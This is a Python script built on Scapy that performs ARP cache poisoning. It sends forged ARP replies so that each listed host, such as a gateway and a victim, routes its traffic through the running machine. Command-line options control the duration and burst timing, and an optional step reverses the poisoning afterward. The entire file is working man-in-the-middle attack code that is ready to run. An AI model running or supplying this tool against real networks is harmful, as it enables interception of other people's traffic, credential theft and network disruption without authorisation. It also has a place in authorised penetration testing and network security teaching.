#!/usr/bin/env python3

import time
from typing import Iterable, List, Dict
from itertools import permutations
import argparse as ap

from scapy.arch import get_if_hwaddr
from scapy.config import conf
from scapy.layers.l2 import ARP
from scapy.sendrecv import send, sr

MAC_REQUEST_RETRIES = 3
MAC_REQUEST_TIMEOUT = 3


def _request_macs(target_ips: Iterable[str], verbose: bool = False) -> Dict[str, str]:
    reqs = ARP(pdst=list(target_ips), op="who-has")
    replies, _ = sr(reqs, retry=MAC_REQUEST_RETRIES, timeout=MAC_REQUEST_TIMEOUT, verbose=verbose)
    return {reply_stim[ARP].pdst: reply_resp[ARP].hwsrc
            for reply_stim, reply_resp in replies}


def _new_recovery_broadcast_arps(victim_ips: Iterable[str]) -> List[ARP]:
    """
    Attempts to create a packet to reverse the ARP Spoofing.
    If a MAC address can't be retrieved, it will be dropped.
    A very expensive function, as it carries out ARP-requests before the packets are constructed.
    """
    victim_macs = _request_macs(victim_ips)
    return [ARP(psrc=v_ip, pdst=v_ip, hwsrc=v_mac)
            for v_ip, v_mac in victim_macs.items()]


def _new_unsolicited_reply_redirect(victim_ip: str, redirect_from_ip: str) -> ARP:
    our_mac = get_if_hwaddr(conf.iface)
    return ARP(hwsrc=our_mac, psrc=redirect_from_ip, pdst=victim_ip, op="is-at")


def mass_arp_poison(victim_ips: Iterable[str],
                    burst_delay: int,
                    n_bursts: int,
                    verbose: bool = False
                    ) -> None:
    """
    Attempts to convince every host at the given addresses that we're each of the other computers.
    In the simplest form, victim_ips can be a tuple of (gateway_ip, victim_ip) to intercept a single computer's traffic.
    """
    packets = [_new_unsolicited_reply_redirect(v1, v2)
               for v1, v2 in permutations(victim_ips, 2)]
    for _ in range(n_bursts):
        send(packets, verbose=verbose)
        time.sleep(burst_delay)


def mass_reverse_arp_poisoning(victim_ips: Iterable[str], verbose: bool = False) -> None:
    """
    Attempts to reverse a previous ARP cache poisoning by advertising each victim's MAC.
    """
    packets = _new_recovery_broadcast_arps(victim_ips)
    send(packets, verbose=verbose)


def intercept_between(victim_ips: Iterable[str],
                      burst_delay: int,
                      n_bursts: int,
                      reverse_poisoning_after: bool = True,
                      verbose: bool = False
                      ) -> None:
    """
    Attempts to convince every host at the given addresses that we're each of the other computers.
    In the simplest form, victim_ips can be a tuple of (gateway_ip, victim_ip) to intercept a single computer's traffic.

    If reverse_reverse_poisoning_after, it will also attempt to reverse a previous ARP cache poisoning by
    advertising each victim's MAC.
    """
    try:
        mass_arp_poison(victim_ips, burst_delay, n_bursts, verbose)
    except KeyboardInterrupt:
        pass
    finally:
        if reverse_poisoning_after:
            mass_reverse_arp_poisoning(victim_ips, verbose)


def main():
    parser = ap.ArgumentParser()
    parser.add_argument("ips", nargs="+",
                        help="The IP addresses to redirect traffic from.")
    parser.add_argument("-r", "--recover_after", action="store_true",
                        help="Whether to attempt to reverse the ARP cache poisoning afterward.")
    parser.add_argument("-t", "--total_time", default=60, type=int,
                        help="The total amount of time in seconds to run for.")
    parser.add_argument("-b", "--burst_delay", default=3, type=int,
                        help="The delay in seconds between bursts of ARPs being sent out.")
    parser.add_argument("-v", "--verbose", action="store_true",
                        help="Whether Scapy's verbose output should be show for all operations.")
    args = parser.parse_args()

    if len(args.ips) < 2:
        print("At least two addresses should be specified.")
        return

    n_bursts = args.total_time // args.burst_delay
    intercept_between(args.ips, args.burst_delay, n_bursts, args.recover_after, args.verbose)


if __name__ == '__main__':
    main()